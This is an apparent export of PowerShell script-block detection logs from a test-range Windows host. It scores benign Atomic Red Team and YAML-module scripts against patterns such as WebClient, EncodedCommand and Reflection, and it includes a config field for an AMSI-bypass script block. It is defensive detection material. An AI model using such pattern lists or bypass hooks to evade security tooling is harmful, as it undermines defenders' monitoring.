            $depParams.add(""Dependencies"", $dependencies)
        }
        if (($cleanupCommands -ne """") -and ($null -ne $cleanupCommands)) { $depParams.add(""ExecutorCleanupCommand"", $cleanupCommands) }
        $depParams.add(""ExecutorElevationRequired"", $elevationRequired)

        $AtomicTest = New-AtomicTest -Name $testName -Description $testDesc -SupportedPlatforms $platforms -InputArguments $inputArgs -ExecutorType $executor -ExecutorCommand $attackCommands -WarningVariable +warnings @depParams
        $yaml = ($AtomicTest | ConvertTo-Yaml) -replace ""^"", ""- "" -replace ""`n"", ""`n  ""
        foreach ($warning in $warnings) { Show-UDToast $warning -BackgroundColor LightYellow -Duration 10000 }
        New-UDElement -ID yaml -Tag pre -Content { $yaml }
    }

    $epYamlModal = New-UDEndpoint -Endpoint {
        Show-UDModal -Header { New-UDHeading -Size 3 -Text ""Test Definition YAML"" } -Content {
            new-udrow -endpoint $BuildAndDisplayYamlScriptBlock
            # Left arrow button (decrease indentation)
            New-UDButton -Icon arrow_circle_left -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    if (-not $yaml.startsWith(""- "")) {
                        Set-UDElement -Id ""yaml"" -Content {
                            $yaml -replace ""^  "", """" -replace ""`n  "", ""`n""
                        }
                    }
                }
            )
            # Right arrow button (increase indentation)
            New-UDButton -Icon arrow_circle_right -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    Set-UDElement -Id ""yaml"" -Content {
                        $yaml -replace ""^"", ""  "" -replace ""`n"", ""`n  ""
                    }
                }
            )
            # Copy Yaml to clipboard
            New-UDButton -Text ""Copy"" -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    Set-UDClipboard -Data $yaml
                    Show-UDToast -Message ""Copied YAML to the Clipboard"" -BackgroundColor YellowGreen
                }
            )
        }
    }

    $epFillTestData = New-UDEndpoint -Endpoint {
        Add-UDElement -ParentId ""inputCard"" -Content { New-InputArgCard }
        Add-UDElement -ParentId ""depCard""   -Content { New-depCard }
        Start-Sleep 1
        Set-UDElement -Id atomicName -Attributes @{value = ""My new atomic"" }
        Set-UDElement -Id atomicDescription -Attributes @{value = ""This is the atomic description"" }
        Set-UDElement -Id attackCommands -Attributes @{value = ""echo this`necho that"" }
        Set-UDElement -Id cleanupCommands -Attributes @{value = ""cleanup commands here`nand here..."" }
        # InputArgs
        $cardNumber = 1
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgName"" -Attributes @{value = ""input_arg_1"" }
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgDescription"" -Attributes @{value = ""InputArg1 description"" }
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgDefault"" -Attributes @{value = ""this is the default value"" }
        # dependencies
        Set-UDElement -Id ""depCard$cardNumber-depDescription"" -Attributes @{value = ""This file must exist"" }
        Set-UDElement -Id ""depCard$cardNumber-prereqCommand"" -Attributes @{value = ""if (this) then that"" }
        Set-UDElement -Id ""depCard$cardNumber-getPrereqCommand"" -Attributes @{value = ""iwr"" }

    }
    ############## End EndPoint (ep) Definitions

    ############## Static Definitions
    $supportedPlatforms = New-UDLayout -Columns 4 {
        New-UDElement -Tag Label -Attributes @{ style = @{""font-size"" = ""15px"" } } -Content { ""Supported Platforms:"" }
        New-UDCheckbox -FilledIn -Label ""Windows"" -Checked -Id spWindows
        New-UDCheckbox -FilledIn -Label ""Linux"" -Id spLinux
        New-UDCheckbox -FilledIn -Label ""macOS""-Id spMacOS
    }

    $executorRow = New-UDLayout -Columns 4 {
        New-UDSelectX 'executorSelector' ""Executor for Attack Commands""
        New-UDCheckbox -ID elevationRequired -FilledIn -Label ""Requires Elevation to Execute Successfully?""
    }

    $genarateYamlButton = New-UDRow -Columns {
        New-UDColumn -Size 8 -Content { }
        New-UDColumn -Size 4 -Content {
            New-UDButton -Text ""Generate Test Definition YAML"" -OnClick ( $epYamlModal )
        }
    }

    ############## End Static Definitions

    ############## The Dashboard
    $idleTimeOut = New-TimeSpan -Minutes 10080
    $db = New-UDDashboard -Title ""Atomic Test Creation"" -IdleTimeout $idleTimeOut -EndpointInitialization $ei -Content {
        New-UDCard -Id ""mainCard"" -Content {
            New-UDCard -Content {
                New-UDTextBoxX 'atomicName' ""Atomic Test Name""
                New-UDTextAreaX ""atomicDescription"" ""Atomic Test Description""
                $supportedPlatforms
                New-UDTextAreaX ""attackCommands"" ""Attack Commands""
                $executorRow
                New-UDTextAreaX ""cleanupCommands"" ""Cleanup Commands (Optional)""
                $genarateYamlButton
            }

            # input args
            New-UDCard -Id ""inputCard"" -Endpoint {
                New-UDButton -Text ""Add Input Argument (Optional)"" -OnClick (
                    New-UDEndpoint -Endpoint { Add-UDElement -ParentId ""inputCard"" -Content { New-InputArgCard } }
                )
            }

            # prereqs
            New-UDCard -Id ""depCard"" -Endpoint {
                New-UDLayout -columns 4 {
                    New-UDButton -Text ""Add Prerequisite (Optional)"" -OnClick (
                        New-UDEndpoint -Endpoint { Add-UDElement -ParentId ""depCard"" -Content { New-depCard } }
                    )
                    New-UDSelectX 'preReqEx' ""Executor for Prereq Commands""
                }
            }
        }

        # button to fill form with test data for development purposes
        if ($false) { New-UDButton -Text ""Fill Test Data"" -OnClick ( $epFillTestData ) }
    }
    ############## End of the Dashboard

    Stop-AtomicGUI
    Start-UDDashboard -port $port -Dashboard $db -Name ""AtomicGUI"" -ListenAddress 127.0.0.1
    start-process http://localhost:$port
}

function Stop-AtomicGUI {
    Get-UDDashboard -Name 'AtomicGUI' | Stop-UDDashboard
    Write-Host ""Stopped all AtomicGUI Dashboards""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'start-process'"
"12/16/2024 8:34:55 PM","35710822","7",", WebClient, SuspiciousKeyword, Reflection","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]","2194","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#

$here = Split-Path -Parent $MyInvocation.MyCommand.Path

function Load-Assembly {
    $libDir = Join-Path $here ""lib""
    $assemblies = @{
        ""core"" = Join-Path $libDir ""netstandard2.1\YamlDotNet.dll"";
        ""net45"" = Join-Path $libDir ""net45\YamlDotNet.dll"";
        ""net35"" = Join-Path $libDir ""net35\YamlDotNet.dll"";
    }

    if ($PSVersionTable.Keys -contains ""PSEdition"") {
        if ($PSVersionTable.PSEdition -eq ""Core"") {
            return [Reflection.Assembly]::LoadFrom($assemblies[""core""])
        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net45""])
        } else {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
        }
    } else { # Powershell 4.0 and lower do not know ""PSEdition"" yet
        return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
    }
}


function Initialize-Assemblies {
    $requiredTypes = @(
        ""Parser"", ""MergingParser"", ""YamlStream"",
        ""YamlMappingNode"", ""YamlSequenceNode"",
        ""YamlScalarNode"", ""ChainedEventEmitter"",
        ""Serializer"", ""Deserializer"", ""SerializerBuilder"",
        ""StaticTypeResolver""
    )

    $type = ""YamlDotNet.Serialization.Serializer"" -as [type]
    if (!$type) {
        return Load-Assembly
    }

    $yaml = $type.Assembly
    foreach ($i in $requiredTypes){
        if ($i -notin $yaml.DefinedTypes.Name) {
            Throw ""YamlDotNet is loaded but missing required types ($i). Older version installed on system?""
        }
    }
}

Initialize-Assemblies | Out-Null
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
"12/16/2024 8:34:55 PM","35710709","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","1039","function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {
    $success = $false
    $null = @(
        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null
        $ms = New-Object IO.MemoryStream
        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)
        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        $actualHash = (Get-FileHash -InputStream $ms).Hash
        if ( $hash -eq $actualHash) {
            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)
            $ms.CopyTo($fileStream);
            $fileStream.Close()
            $success = $true
        }
        else {
            Write-Host -ForegroundColor red ""File hash mismatch, expected: $hash, actual: $actualHash""
        }
    )
    $success
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710682","6",", EncodedCommand, SuspiciousCmdlet, Get","EncodedCommand [Score: 4]; SuspiciousCmdlet [Score: 1]; Get [Score: 1]","431","function Get-PreferredIPAddress($isWindows) {
    if ($isWindows) {
        return (Get-NetIPAddress | Where-Object { $_.PrefixOrigin -ne ""WellKnown"" }).IPAddress
    }
    elseif ($IsMacOS) {
        return /sbin/ifconfig -l | /usr/bin/xargs -n1 /usr/sbin/ipconfig getifaddr
    }
    elseif ($IsLinux) {
        return ip -4 -br addr show | sed -n -e 's/^.*UP\s* //p' | cut -d ""/"" -f 1
    }
    else {
        return ''
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: '-e ''
Pattern 'SuspiciousCmdlet' matched: 'Get-NetIPAddress'"
"12/16/2024 8:34:55 PM","35710657","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","5396","
$artConfig = [PSCustomObject]@{

  # [optional] These two configs are calculated programatically, you probably don't need to change them
  basehostname               = $((hostname | Select-String -Pattern ""(.*?)(-[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})?$"").Matches.Groups[1].value)
  OS                         = $( if ($IsLinux) { ""linux"" } elseif ($IsMacOS) { ""macos"" } else { ""windows"" })

  # [optional(if using default install paths)] Paths to your Atomic Red Team ""atomics"" folder and your ""invoke-atomicredteam"" folder
  PathToInvokeFolder         = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })  ""/AtomicRedTeam/invoke-atomicredteam"" # this is the default install path so you probably don't need to change this
  PathToPublicAtomicsFolder  = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })  ""AtomicRedTeam/atomics"" # this is the default install path so you probably don't need to change this
  PathToPrivateAtomicsFolder = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })   ""PrivateAtomics/atomics"" # if you aren't providing your own private atomics that are custom written by you, just leave this as is

  # [ Optional ] The user that will be running each atomic test
  user                       = $( if ($IsLinux -or $IsMacOS) { $env:USER } else { ""$env:USERDOMAIN\$env:USERNAME"" }) # example ""corp\atomicrunner""

  # [optional] the path where you want the folder created that houses the logs and the runner schedule. Defaults to users home directory
  basePath                   = $( if (!$IsLinux -and !$IsMacOS) { $env:USERPROFILE } else { $env:HOME }) # example ""C:\Users\atomicrunner""

  # [optional]
  scheduleTimeSpan           = New-TimeSpan -Days 7 # the time in which all tests on the schedule should complete
  kickOffDelay               = New-TimeSpan -Minutes 0 # an additional delay before Invoke-KickoffAtomicRunner calls Invoke-AtomicRunner
  scheduleFileName           = ""AtomicRunnerSchedule.csv""

  # [optional] Logging Module, uses Syslog-ExecutionLogger if left blank and the syslogServer and syslogPort are set, otherwise it uses the Default-ExecutionLogger
  LoggingModule              = ''

  # [optional] Syslog configuration, default execution logs will be sent to this server:port
  syslogServer               = '' # set to empty string '' if you don't want to log atomic execution details to a syslog server (don't includle http(s):\\)
  syslogPort                 = 514
  syslogProtocol             = 'UDP' # options are UDP, TCP, TCPwithTLS

  verbose                    = $true; # set to true for more log output

  # [optional] logfile filename configs
  logFolder                  = ""AtomicRunner-Logs""
  timeLocal                  = (Get-Date(get-date) -uformat ""%Y-%m-%d"").ToString()
  logFileName                = ""$($artConfig.timeLocal)`_$($artConfig.basehostname)-ExecLog.csv""

  # amsi bypass script block (applies to Windows only)
  absb                       = $null

  # AtomicRunnerService install directory
  ServiceInstallDir                 = ""${ENV:windir}\System32""

}

# If you create a file called privateConfig.ps1 in the same directory as you installed Invoke-AtomicRedTeam you can overwrite any of these settings with your custom values
$root = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent
$pathToPrivateConfig = Join-Path $root ""privateConfig.ps1""
if (Test-Path ($pathToPrivateConfig)) {
  if ($IsLinux -or $IsMacOS) {
    chmod +x $pathToPrivateConfig
  }
  & ($pathToPrivateConfig)
}

#####################################################################################
# All of the configs below are calculated using the script block in the ""Value"" field.
# This way, when you change the 'basePath' everything else is updated.
# You should probably leave all of the stuff below alone.
#####################################################################################

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""runnerFolder""
  Value       = { Join-Path $artConfig.basePath ""AtomicRunner"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""atomicLogsPath""
  Value       = { Join-Path $artConfig.basePath $artConfig.logFolder }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""scheduleFile""
  Value       = { Join-Path $artConfig.runnerFolder  $artConfig.scheduleFileName }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""credFile""
  Value       = { Join-Path $artConfig.runnerFolder ""psc_$($artConfig.basehostname).txt"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""execLogPath""
  Value       = { Join-Path $artConfig.atomicLogsPath $artConfig.logFileName }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""stopFile""
  Value       = { Join-Path $artConfig.runnerFolder ""stop.txt"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""logFile""
  Value       = { Join-Path $artConfig.atomicLogsPath ""log-$($artConfig.basehostname).txt"" }
}
Add-Member @scriptParam
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'Get' matched: 'get-'"
"12/16/2024 8:34:54 PM","35710642","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","16921","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#

enum SerializationOptions {
    None = 0
    Roundtrip = 1
    DisableAliases = 2
    EmitDefaults = 4
    JsonCompatible = 8
    DefaultToStaticType = 16
    WithIndentedSequences = 32
}
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$assemblies = Join-Path $here ""Load-Assemblies.ps1""
$infinityRegex = [regex]::new('^[-+]?(\.inf|\.Inf|\.INF)$', ""Compiled, CultureInvariant"");

if (Test-Path $assemblies) {
    . $here\Load-Assemblies.ps1
}

function Get-YamlDocuments {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [string]$Yaml,
        [switch]$UseMergingParser=$false
    )
    PROCESS {
        $stringReader = new-object System.IO.StringReader($Yaml)
        $parser = New-Object ""YamlDotNet.Core.Parser"" $stringReader
        if($UseMergingParser) {
            $parser = New-Object ""YamlDotNet.Core.MergingParser"" $parser
        }

        $yamlStream = New-Object ""YamlDotNet.RepresentationModel.YamlStream""
        $yamlStream.Load([YamlDotNet.Core.IParser] $parser)

        $stringReader.Close()

        return $yamlStream
    }
}

function Convert-ValueToProperType {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [System.Object]$Node
    )
    PROCESS {
        if (!($Node.Value -is [string])) {
            return $Node
        }
        
        if ([string]::IsNullOrEmpty($Node.Tag) -eq $false) {
            switch($Node.Tag) {
                ""tag:yaml.org,2002:str"" {
                    return $Node.Value
                }
                ""tag:yaml.org,2002:null"" {
                    return $null
                }
                ""tag:yaml.org,2002:bool"" {
                    $parsedValue = $false
                    if (![boolean]::TryParse($Node.Value, [ref]$parsedValue)) {
                        Throw (""failed to parse scalar {0} as boolean"" -f $Node)
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:int"" {
                    $parsedValue = 0
                    if ($node.Value.Length -gt 2) {
                        switch ($node.Value.Substring(0, 2)) {
                            ""0o"" {
                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 8)
                            }
                            ""0x"" {
                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 16)
                            }
                            default {
                                if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                                    Throw (""failed to parse scalar {0} as long"" -f $Node)
                                }
                            }
                        }
                    } else {
                        if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                            Throw (""failed to parse scalar {0} as long"" -f $Node)
                        }
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:float"" {
                    $parsedValue = 0.0
                    if ($infinityRegex.Matches($Node.Value)) {
                        $prefix = $Node.Value.Substring(0, 1)
                        switch ($prefix) {
                            ""-"" {
                                return [double]::NegativeInfinity
                            }
                            default {
                                # Prefix is either missing or is a +
                                return [double]::PositiveInfinity
                            }
                        }
                    }
                    if (![double]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                        Throw (""failed to parse scalar {0} as double"" -f $Node)
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:timestamp"" {
                    # From the YAML spec: http://yaml.org/type/timestamp.html
                    [DateTime]$parsedValue = [DateTime]::MinValue
                    $ts = [DateTime]::SpecifyKind($Node.Value, [System.DateTimeKind]::Utc)
                    $tss = $ts.ToString(""o"")
                    if(![datetime]::TryParse($tss, $null, [System.Globalization.DateTimeStyles]::RoundtripKind, [ref] $parsedValue)) {
                        Throw (""failed to parse scalar {0} as DateTime"" -f $Node)
                    }
                    return $parsedValue
                }
            }
        }

        if ($Node.Style -eq 'Plain')
        {
            $types = @([int], [long], [double], [boolean], [decimal])
            foreach($i in $types){
                $parsedValue = New-Object -TypeName $i.FullName
                if ($i.IsAssignableFrom([boolean])){
                    $result = $i::TryParse($Node,[ref]$parsedValue) 
                } else {
                    $result = $i::TryParse($Node, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)
                }
                if( $result ) {
                    return $parsedValue
                }
            }
        }

        if ($Node.Style -eq 'Plain' -and $Node.Value -in '','~','null','Null','NULL') {
            return $null
        }

        return $Node.Value
    }
}

function Convert-YamlMappingToHashtable {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [YamlDotNet.RepresentationModel.YamlMappingNode]$Node,
        [switch] $Ordered
    )
    PROCESS {
        if ($Ordered) { $ret = [ordered]@{} } else { $ret = @{} }
        foreach($i in $Node.Children.Keys) {
            $ret[$i.Value] = Convert-YamlDocumentToPSObject $Node.Children[$i] -Ordered:$Ordered
        }
        return $ret
    }
}

function Convert-YamlSequenceToArray {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [YamlDotNet.RepresentationModel.YamlSequenceNode]$Node,
        [switch]$Ordered
    )
    PROCESS {
        $ret = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
        foreach($i in $Node.Children){
            $ret.Add((Convert-YamlDocumentToPSObject $i -Ordered:$Ordered))
        }
        return ,$ret
    }
}

function Convert-YamlDocumentToPSObject {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [System.Object]$Node, 
        [switch]$Ordered
    )
    PROCESS {
        switch($Node.GetType().FullName){
            ""YamlDotNet.RepresentationModel.YamlMappingNode""{
                return Convert-YamlMappingToHashtable $Node -Ordered:$Ordered
            }
            ""YamlDotNet.RepresentationModel.YamlSequenceNode"" {
                return Convert-YamlSequenceToArray $Node -Ordered:$Ordered
            }
            ""YamlDotNet.RepresentationModel.YamlScalarNode"" {
                return (Convert-ValueToProperType $Node)
            }
        }
    }
}

function Convert-HashtableToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [hashtable]$Data
    )
    foreach($i in $($data.Keys)) {
        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]
    }
    return $Data
}

function Convert-OrderedHashtableToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [System.Collections.Specialized.OrderedDictionary] $Data
    )
    foreach ($i in $($data.Keys)) {
        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]
    }
    return $Data
}

function Convert-ListToGenericList {
    Param(
        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]
        [array]$Data=@()
    )
    $ret = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
    for($i=0; $i -lt $Data.Count; $i++) {
        $ret.Add((Convert-PSObjectToGenericObject $Data[$i]))
    }
    return ,$ret
}

function Convert-PSCustomObjectToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [PSCustomObject]$Data
    )
    $ret = [System.Collections.Generic.Dictionary[string,object]](New-Object 'System.Collections.Generic.Dictionary[string,object]')
    foreach ($i in $Data.psobject.properties) {
        $ret[$i.Name] = Convert-PSObjectToGenericObject $i.Value
    }
    return $ret
}

function Convert-PSObjectToGenericObject {
    Param(
        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]
        [System.Object]$Data
    )

    if ($null -eq $data) {
        return $data
    }

    $dataType = $data.GetType()
    if ($data -isnot [System.Object]) {
        return $data -as $dataType
    }

    if ($dataType.FullName -eq ""System.Management.Automation.PSCustomObject"") {
        return Convert-PSCustomObjectToDictionary $data
    } elseif (([System.Collections.Specialized.OrderedDictionary].IsAssignableFrom($dataType))){
        return Convert-OrderedHashtableToDictionary $data
    } elseif (([System.Collections.IDictionary].IsAssignableFrom($dataType))){
        return Convert-HashtableToDictionary $data
    } elseif (([System.Collections.IList].IsAssignableFrom($dataType))) {
        return Convert-ListToGenericList $data
    }
    return $data -as $dataType
}

function ConvertFrom-Yaml {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, ValueFromPipeline=$true, Position=0)]
        [string]$Yaml,
        [switch]$AllDocuments=$false,
        [switch]$Ordered,
        [switch]$UseMergingParser=$false
    )

    BEGIN {
        $d = """"
    }
    PROCESS {
        if($Yaml -is [string]) {
            $d += $Yaml + ""`n""
        }
    }

    END {
        if($d -eq """"){
            return
        }
        $documents = Get-YamlDocuments -Yaml $d -UseMergingParser:$UseMergingParser
        if (!$documents.Count) {
            return
        }
        if($documents.Count -eq 1){
            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered
        }
        if(!$AllDocuments) {
            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered
        }
        $ret = @()
        foreach($i in $documents) {
            $ret += Convert-YamlDocumentToPSObject $i.RootNode -Ordered:$Ordered
        }
        return $ret
    }
}

$stringQuotingEmitterSource = @""
using System;
using System.Text.RegularExpressions;
using YamlDotNet;
using YamlDotNet.Core;
using YamlDotNet.Serialization;
using YamlDotNet.Serialization.EventEmitters;
public class StringQuotingEmitter: ChainedEventEmitter {
    // Patterns from https://yaml.org/spec/1.2/spec.html#id2804356
    private static Regex quotedRegex = new Regex(@`""^(\~|null|true|false|on|off|yes|no|y|n|[-+]?(\.[0-9]+|[0-9]+(\.[0-9]*)?)([eE][-+]?[0-9]+)?|[-+]?(\.inf))?$`"", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    public StringQuotingEmitter(IEventEmitter next): base(next) {}

    public override void Emit(ScalarEventInfo eventInfo, IEmitter emitter) {
        var typeCode = eventInfo.Source.Value != null
        ? Type.GetTypeCode(eventInfo.Source.Type)
        : TypeCode.Empty;

        switch (typeCode) {
            case TypeCode.Char:
                if (Char.IsDigit((char)eventInfo.Source.Value)) {
                    eventInfo.Style = ScalarStyle.DoubleQuoted;
                }
                break;
            case TypeCode.String:
                var val = eventInfo.Source.Value.ToString();
                if (quotedRegex.IsMatch(val))
                {
                    eventInfo.Style = ScalarStyle.DoubleQuoted;
                } else if (val.IndexOf('\n') > -1) {
                    eventInfo.Style = ScalarStyle.Literal;
                }
                break;
        }

        base.Emit(eventInfo, emitter);
    }

    public static SerializerBuilder Add(SerializerBuilder builder) {
        return builder.WithEventEmitter(next => new StringQuotingEmitter(next));
    }
}
""@

if (!([System.Management.Automation.PSTypeName]'StringQuotingEmitter').Type) {
    $referenceList = @([YamlDotNet.Serialization.Serializer].Assembly.Location,[Text.RegularExpressions.Regex].Assembly.Location)
    if ($PSVersionTable.PSEdition -eq ""Core"") {
        $referenceList += [IO.Directory]::GetFiles([IO.Path]::Combine($PSHOME, 'ref'), 'netstandard.dll', [IO.SearchOption]::TopDirectoryOnly)
        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp -CompilerOptions ""-nowarn:1701""
    } else {
        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp
    }
}

function Get-Serializer {
    Param(
        [Parameter(Mandatory=$true)][SerializationOptions]$Options
    )
    
    $builder = New-Object ""YamlDotNet.Serialization.SerializerBuilder""
    
    if ($Options.HasFlag([SerializationOptions]::Roundtrip)) {
        $builder = $builder.EnsureRoundtrip()
    }
    if ($Options.HasFlag([SerializationOptions]::DisableAliases)) {
        $builder = $builder.DisableAliases()
    }
    if ($Options.HasFlag([SerializationOptions]::EmitDefaults)) {
        $builder = $builder.EmitDefaults()
    }
    if ($Options.HasFlag([SerializationOptions]::JsonCompatible)) {
        $builder = $builder.JsonCompatible()
    }
    if ($Options.HasFlag([SerializationOptions]::DefaultToStaticType)) {
        $builder = $builder.WithTypeResolver((New-Object ""YamlDotNet.Serialization.TypeResolvers.StaticTypeResolver""))
    }
    if ($Options.HasFlag([SerializationOptions]::WithIndentedSequences)) {
        $builder = $builder.WithIndentedSequences()
    }
    $builder = [StringQuotingEmitter]::Add($builder)
    return $builder.Build()
}

function ConvertTo-Yaml {
    [CmdletBinding(DefaultParameterSetName = 'NoOptions')]
    Param(
        [Parameter(ValueFromPipeline = $true, Position=0)]
        [System.Object]$Data,

        [string]$OutFile,

        [Parameter(ParameterSetName = 'Options')]
        [SerializationOptions]$Options = [SerializationOptions]::Roundtrip,

        [Parameter(ParameterSetName = 'NoOptions')]
        [switch]$JsonCompatible,
        
        [switch]$KeepArray,

        [switch]$Force
    )
    BEGIN {
        $d = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
    }
    PROCESS {
        if($data -is [System.Object]) {
            $d.Add($data)
        }
    }
    END {
        if ($d -eq $null -or $d.Count -eq 0) {
            return
        }
        if ($d.Count -eq 1 -and !($KeepArray)) {
            $d = $d[0]
        }
        $norm = Convert-PSObjectToGenericObject $d
        if ($OutFile) {
            $parent = Split-Path $OutFile
            if (!(Test-Path $parent)) {
                Throw ""Parent folder for specified path does not exist""
            }
            if ((Test-Path $OutFile) -and !$Force) {
                Throw ""Target file already exists. Use -Force to overwrite.""
            }
            $wrt = New-Object ""System.IO.StreamWriter"" $OutFile
        } else {
            $wrt = New-Object ""System.IO.StringWriter""
        }
    
        if ($PSCmdlet.ParameterSetName -eq 'NoOptions') {
            $Options = 0
            if ($JsonCompatible) {
                # No indent options :~(
                $Options = [SerializationOptions]::JsonCompatible
            }
        }

        try {
            $serializer = Get-Serializer $Options
            $serializer.Serialize($wrt, $norm)
        }
        catch{
            $_
        }
        finally {
            $wrt.Close()
        }
        if ($OutFile) {
            return
        } else {
            return $wrt.ToString()
        }
    }
}

New-Alias -Name cfy -Value ConvertFrom-Yaml
New-Alias -Name cty -Value ConvertTo-Yaml

Export-ModuleMember -Function ConvertFrom-Yaml,ConvertTo-Yaml -Alias cfy,cty
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'
